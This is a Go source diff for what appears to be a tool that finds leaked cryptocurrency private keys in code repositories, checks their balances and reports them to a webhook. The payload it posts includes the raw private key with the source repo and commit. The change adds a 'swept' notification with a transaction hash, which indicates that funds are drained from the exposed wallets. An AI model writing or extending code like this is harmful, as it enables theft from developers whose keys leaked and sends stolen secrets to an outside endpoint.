@@ -4,24 +4,28 @@ import (
 	"bytes"
 	"context"
 	"encoding/json"
-	"fmt"
 	"io"
 	"net/http"
+	"strings"
 	"time"
 )
 
 type webhookPayload struct {
+	Type         string `json:"type"` // "funded" or "swept"
 	Chain        string `json:"chain"`
 	Address      string `json:"address"`
 	BalanceHuman string `json:"balance_human"`
-	RawKey       string `json:"private_key"`
+	RawKey       string `json:"private_key,omitempty"`
 	SourceRepo   string `json:"source_repo"`
 	SourceCommit string `json:"source_commit"`
+	TxHash       string `json:"tx_hash,omitempty"`
+	SweepError   string `json:"sweep_error,omitempty"`
 	Timestamp    string `json:"timestamp"`
 }
 
 func notify(ctx context.Context, key FoundKey, b BalanceResult, webhookURL string) {
 	payload := webhookPayload{
+		Type:         "funded",
 		Chain:        b.Chain,
 		Address:      b.Address,
 		BalanceHuman: b.BalanceHuman,
@@ -30,7 +34,26 @@ func notify(ctx context.Context, key FoundKey, b BalanceResult, webhookURL strin
 		SourceCommit: key.CommitSHA,
 		Timestamp:    time.Now().UTC().Format(time.RFC3339),
 	}
+	sendNotify(ctx, payload, webhookURL)
+}
 
+func notifySwept(ctx context.Context, key FoundKey, b BalanceResult, txHash string, sweepErr string, webhookURL string) {
+	sweptURL := strings.Replace(webhookURL, "/funded", "/swept", 1)
+	payload := webhookPayload{
+		Type:         "swept",
+		Chain:        b.Chain,
+		Address:      b.Address,
+		BalanceHuman: b.BalanceHuman,
+		SourceRepo:   key.Repo,
+		SourceCommit: key.CommitSHA,
+		TxHash:       txHash,
+		SweepError:   sweepErr,
+		Timestamp:    time.Now().UTC().Format(time.RFC3339),
+	}
+	sendNotify(ctx, payload, sweptURL)
+}
+
+func sendNotify(ctx context.Context, payload webhookPayload, webhookURL string) {
 	body, err := json.Marshal(payload)
 	if err != nil {
 		logger.Printf("[notify] marshal error: %v", err)
@@ -57,7 +80,4 @@ func notify(ctx context.Context, key FoundKey, b BalanceResult, webhookURL strin
 		logger.Printf("[notify] webhook returned %d: %s", resp.StatusCode, string(respBody))
 		return
 	}
-
-	fmt.Printf("NOTIFIED %s %s from %s (key in %s@%s)\n",
-		b.BalanceHuman, b.Chain, b.Address, key.Repo, key.CommitSHA[:8])
 }
